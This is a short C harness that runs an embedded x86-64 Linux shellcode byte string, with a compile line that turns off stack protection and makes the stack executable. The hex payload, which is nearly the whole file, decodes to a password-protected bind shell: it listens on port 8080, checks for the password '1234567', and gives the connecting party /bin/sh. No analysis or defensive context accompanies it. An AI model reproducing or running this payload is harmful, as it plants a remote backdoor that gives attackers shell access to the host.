// compile: gcc -fno-stack-protector -z execstack -o harness harness.c
#include <stdio.h>
#include <string.h>
unsigned char code[] = \
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x31\xd2\x0f\x05\x48\x89\xc7\x6a\x31\x58\x52\x52\x66\x68\x1f\x90\x66\x6a\x02\x48\x89\xe6\x48\x83\xc2\x10\x0f\x05\x6a\x32\x58\x48\x31\xf6\x0f\x05\x6a\x2b\x58\x48\x89\xf2\x0f\x05\x49\x89\xc1\x48\x89\xf0\x4c\x89\xcf\x48\x83\xec\x10\x48\x89\xe6\xb2\x10\x0f\x05\x48\xb8\x31\x32\x33\x34\x35\x36\x37\x0a\x48\x89\xf7\x48\xaf\x75\x2c\x6a\x02\x5e\x4c\x89\xcf\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x48\x31\xd2\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05";

int main()
{
   int (*ret)() = (int(*)()) code;
   ret();
   return 0;
}
